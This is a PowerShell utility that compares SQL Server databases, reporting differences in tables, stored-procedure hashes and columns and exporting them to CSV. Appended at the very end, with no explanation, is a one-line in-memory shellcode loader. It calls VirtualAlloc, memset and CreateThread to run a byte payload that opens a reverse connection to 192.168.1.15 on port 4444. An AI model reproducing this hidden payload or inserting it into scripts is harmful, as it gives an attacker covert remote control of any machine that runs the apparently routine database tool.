param( 
	$SqlServerOne = 'YourDatabaseServer',
	$FirstDatabase = 'FirstDatabaseToCompare', 
	$SqlServerTwo = 'YourDatabaseServer',
	$SecondDatabase = 'SecondDatabaseToCompare',
	[String[]] $DatabaseList,
	$FilePrefix = 'Log',
	[switch]$Log,
	[switch]$Column
	)

$File = $FilePrefix + '{0}-{1}.csv'

$ScriptName = [system.io.path]::GetFilenameWithoutExtension($MyInvocation.InvocationName)


$TableDifferences = @()
$SprocDifferences = @()
$ColumnDifferences = @()


$TableQuery = "
	SELECT name AS TableName
	FROM sys.objects
	WHERE type = 'U'
	AND is_ms_shipped = '0'
	ORDER BY 1"

$SprocQuery = "
	SELECT SPECIFIC_NAME AS SprocName
		, (SELECT CONVERT(NVARCHAR(42),HashBytes('SHA1', ROUTINE_DEFINITION),2)) AS SprocHASH
	FROM INFORMATION_SCHEMA.ROUTINES
	WHERE ROUTINE_TYPE = 'PROCEDURE' 
		AND ROUTINE_NAME NOT LIKE 'dt_%' 
		AND ROUTINE_NAME NOT LIKE '%diagram%' 
		AND ROUTINE_NAME NOT LIKE 'sp_MS%'
	"
	
function write-log([string]$info)
{
    if($loginitialized -eq $false)
	{
        $FileHeader > $logfile            
        $script:loginitialized = $True            
    }            
    $info >> $logfile            
}

function Run-Query()
{
	param (
	$SqlQuery,
	$SqlServer,
	$SqlCatalog, 
	$SqlUser,
	$SqlPass
	)
	
	$SqlConnection = New-Object System.Data.SqlClient.SqlConnection("Data Source=$SqlServer;Integrated Security=SSPI;Initial Catalog=$SqlCatalog;");
	
	$SqlCmd = New-Object System.Data.SqlClient.SqlCommand
	$SqlCmd.CommandText = $SqlQuery
	$SqlCmd.Connection = $SqlConnection
	
	$SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter
	$SqlAdapter.SelectCommand = $SqlCmd
	
	$DataSet = New-Object System.Data.DataSet
	$a = $SqlAdapter.Fill($DataSet)
	
	$SqlConnection.Close()
	
	$DataSet.Tables | Select-Object -ExpandProperty Rows
}


            
$script:logfile = "E:\Dexma\Logs\DMartAudit-$SqlServerOne_$FirstDatabase-$(get-date -format MMddyy).log"
$script:Seperator = @"

$("-" * 25)

"@            
$script:loginitialized = $false            
$script:FileHeader = 
@"

Server, SourceDatabase, ComparedDatabase, DifferentDatabase, Table, Column, Type, Length
"@


Write-Log


foreach ($SecondDatabase in $DatabaseList)
{


$TablesDBOne = Run-Query -SqlQuery $TableQuery -SqlServer $SqlServerOne -SqlCatalog $FirstDatabase -SqlUser $SqlUsernameOne -SqlPass $SqlPasswordOne | Select-Object -Property TableName
$TablesDBTwo = Run-Query -SqlQuery $TableQuery -SqlServer $SqlServerTwo -SqlCatalog $SecondDatabase -SqlUser $SqlUsernameTwo -SqlPass $SqlPasswordTwo | Select-Object -Property TableName


$SprocsDBOne = Run-Query -SqlQuery $SprocQuery -SqlServer $SqlServerOne -SqlCatalog $FirstDatabase -SqlUser $SqlUsernameOne -SqlPass $SqlPasswordOne | Select-Object -Property SprocName, SprocHASH
$SprocsDBTwo = Run-Query -SqlQuery $SprocQuery -SqlServer $SqlServerTwo -SqlCatalog $SecondDatabase -SqlUser $SqlUsernameOne -SqlPass $SqlPasswordOne | Select-Object -Property SprocName, SprocHASH


$Server = @{Name='Server';Expression={if ($_.SideIndicator -eq '<='){'{0}' -f $SqlServerOne} else {'{0}' -f $SqlServerTwo}}}
$Database = @{Name='Database';Expression={if ($_.SideIndicator -eq '<='){'{0}' -f $FirstDatabase} else {'{0}' -f $SecondDatabase}}}

$TableDifference = Compare-Object $TablesDBOne $TablesDBTwo -SyncWindow (($TablesDBOne.count + $TablesDBTwo.count)/2) -Property TableName | select TableName, $Server, $Database
$SprocDifference = Compare-Object $SprocsDBOne $SprocsDBTwo -SyncWindow (($SprocsDBOne.count + $SprocsDBTwo.count)/2) -Property SprocName, SprocHASH | select SprocName, SprocHASH, $Server, $Database

if ($log)
{
	if ($TableDifference)
	{
		foreach ( $Row in $TableDifference )
			{
				write-log "$($Row.Server), $FirstDatabase, $SecondDatabase, $($Row.Database), $($Row.TableName)"
				
				$TableDiff = New-Object -TypeName PSObject
					Add-Member -InputObject $TableDiff -type NoteProperty -Name "SQLServerExists" 	-value $SqlServerOne
					Add-Member -InputObject $TableDiff -type NoteProperty -Name "SQLServerMissing" 	-value $SqlServerTwo
					Add-Member -InputObject $TableDiff -type NoteProperty -Name "Database" 			-value $($Row.Database)
					Add-Member -InputObject $TableDiff -type NoteProperty -Name "Schema"			-Value $($Row.Schema)
					Add-Member -InputObject $TableDiff -type NoteProperty -Name "TableName" 		-value $($Row.TableName)
				$TableDifferences += $TableDiff
			}
	}
	if ($SprocDifference)
	{
		foreach ( $Diff in $SprocDifference | Sort-Object SprocName, SprocHash, Server )
			{
				
				write-log "$($Diff.Server), $($Diff.Database), $($Diff.SprocName), $($Diff.SprocHASH)"
				$SprocDiff = New-Object -TypeName Object
					Add-Member -inputobject $SprocDiff -type NoteProperty -name "DifferingServer" -value $($Diff.Server)
					Add-Member -inputobject $SprocDiff -type NoteProperty -name "DifferingDatabase" -value $($Diff.Database)
					Add-Member -inputobject $SprocDiff -type NoteProperty -name "DifferingSprocName" -value $($Diff.SprocName)
					Add-Member -inputobject $SprocDiff -type NoteProperty -name "DifferingSprocHASH" -value $($Diff.SprocHASH)
				$SprocDifferences += $SprocDiff
			}
	}
}





$SprocDiff | Sort-Object -Property SprocName, SprocHASH | Format-Table -AutoSize | Out-Host

if ($Column)
{
	
	$SameTables = Compare-Object $TablesDBOne $TablesDBTwo -SyncWindow (($TablesDBOne.count + $TablesDBTwo.count)/2) -Property TableName -IncludeEqual -ExcludeDifferent 
	
	$ColumnQuery = @"
select sysobjects.name as TableName
	, syscolumns.name as ColumnName 
	, systypes.name as Type
	, systypes.Length
	, systypes.XUserType
from sysobjects, syscolumns, systypes
where sysobjects.xtype like 'U' and --specify only user tables
	sysobjects.name not like 'dtproperties' and --specify only user tables
	syscolumns.xusertype= systypes.xusertype --get data type info
	and sysobjects.id=syscolumns.id 
	and sysobjects.name = '{0}'
order by sysobjects.name, syscolumns.name, syscolumns.type
"@
	
	foreach ($Table in $SameTables)
	{
		$ColumnsDBOne = Run-Query -SqlQuery ($ColumnQuery -f $table.tablename)  -SqlServer $SqlServerOne -SqlCatalog $FirstDatabase -SqlUser $SqlUsernameOne -SqlPass $SqlPasswordOne | Select-Object -Property TableName, ColumnName, Type, Length, XUserType

		$ColumnsDBTwo = Run-Query -SqlQuery ($ColumnQuery -f $table.tablename) -SqlServer $SqlServerTwo -SqlCatalog $SecondDatabase -SqlUser $SqlUsernameTwo -SqlPass $SqlPasswordTwo | Select-Object -Property TableName, ColumnName, Type, Length, XUserType
		
		$ColumnDifference = Compare-Object $ColumnsDBOne $ColumnsDBTwo -SyncWindow (($ColumnsDBOne.count + $ColumnsDBTwo.count)/2) -Property TableName, ColumnName, Type, Length, XUserType, Name | Select-Object TableName, ColumnName, Type, Length, XUserType, $Server, $Database
		
		if ($log -and $ColumnDifference )
		{
			foreach ( $Row in $ColumnDifference )
			{
				write-log "$($Row.Server), $FirstDatabase, $SecondDatabase, $($Row.Database), $($Row.TableName), $($Row.ColumnName), $($Row.Type), $($Row.length)"
				
				$ColumnDiff = New-Object -TypeName PSObject
					
					
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "Server" 		-Value $SqlServerTwo 
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "Database" 	-Value $($Row.Database)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "TableName" 	-Value $($Row.TableName)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "Schema"		-Value $($Row.Schema)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "ColumnName" 	-Value $($Row.ColumnName)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "Type" 		-Value $($Row.Type)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "Length" 		-Value $($Row.length)
				$ColumnDifferences += $ColumnDiff
			}
		}
		
		
		
	}
}
}
$DBSprocs | Sort-Object -Property DifferingSprocName, DifferingSprocHASH, DifferingServer, DifferingDatabase | Format-Table -AutoSize | Out-Host
Write-Log($DBSprocs | Sort-Object -Property DifferingSprocName, DifferingSprocHASH, DifferingServer, DifferingDatabase | Format-Table -AutoSize)

$TableDifferences | Sort-Object -Property SQLServerTwo, TableName, Database | Export-Csv -Path e:\dexma\logs\TableDiff.$ScriptName.csv -notypeinformation
$SprocDifferences | Sort-Object -Property SQLServerMissing, SprocHASH, SprocName  | Export-Csv -Path e:\dexma\logs\SprocDiff.$ScriptName.csv -notypeinformation
$ColumnDifferences | Sort-Object -Property Server, ColumnName, TableName | Export-Csv -Path e:\dexma\logs\ColDiff.$ScriptName.csv -notypeinformation


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0f,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

